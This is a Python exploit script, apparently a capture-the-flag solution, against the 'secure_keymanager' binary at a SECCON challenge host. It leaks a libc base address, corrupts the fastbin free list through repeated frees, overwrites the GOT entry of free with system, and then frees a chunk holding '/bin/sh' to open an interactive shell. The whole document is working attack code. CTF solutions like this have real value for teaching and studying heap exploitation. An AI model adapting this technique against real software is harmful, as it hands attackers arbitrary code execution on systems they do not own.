#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './secure_keymanager'
context.log_level = 'INFO'
context.terminal = ['tmux', 'splitw', '-h']
mode = args['MODE'].lower()
if not args['ASLR']:
    context.aslr = False
# os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
if args['LIBC']:
    libc = args['LIBC']
    os.environ['LD_PRELOAD'] = libc
else:
    libc = [x for x in elf.libs.keys() if 'libc.so' in x]
    libc = libc and libc[0] or './libc.so.6'
libc = ELF(libc)

def exploit():
    if mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
    elif mode == 'remote':
        io = remote('secure_keymanager.pwn.seccon.jp', 47225)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    def send_account():
        io.sendafter('>>', 'account\0')
        io.sendafter('>>', 'pass\0')

    def add_key(data, length=None, title='\0'):
        io.sendlineafter('>>', 1)
        if length is None:
            length = len(data) + 1
        io.sendlineafter('...', length)
        io.sendafter('...', title)
        io.sendafter('...', data)

    def edit_key(idx, data):
        io.sendlineafter('>>', 3)
        send_account()
        io.sendlineafter('...', idx)
        io.sendafter('...', data)

    def remove_key(idx):
        io.sendlineafter('>>', 4)
        send_account()
        io.sendlineafter('...', idx)

    send_account()

    # leak libc address
    io.sendlineafter('>>', 9)
    io.sendafter('>>', cyclic(0x18))
    io.recvuntil(cyclic(0x18))
    if enhex(libc.buildid) == '3d95dfe155789b0c9253b84e94093da377f6bc9a':
        libc.address = unpack(io.recvuntil("'", drop=True), 'all') - libc.symbols['puts'] - 434
    else:
        libc.address = unpack(io.recvuntil("'", drop=True), 'all') - 0x3c5620
    info('libc base address: %#x', libc.address)

    # make fastbin free list circulate
    add_key(cyclic(0x30))
    add_key(cyclic(0x30))
    add_key(cyclic(0x30))
    remove_key(1)
    remove_key(2)
    add_key(cyclic(0x30))
    remove_key(1)
    remove_key(0)
    remove_key(2)

    # hijack `free` to `system`
    add_key(cyclic(0x30), title=p64(elf.got['free'] - 0x1e))
    add_key(cyclic(0x30))
    add_key(cyclic(0x30))
    add_key('\0', length=0x30, title=fit({
        0: '/bin/sh\0',
        0xe: libc.symbols['system'],
        0x16: libc.symbols['puts']
    }))

    remove_key(3)

    io.interactive()

if __name__ == '__main__':
    exploit()
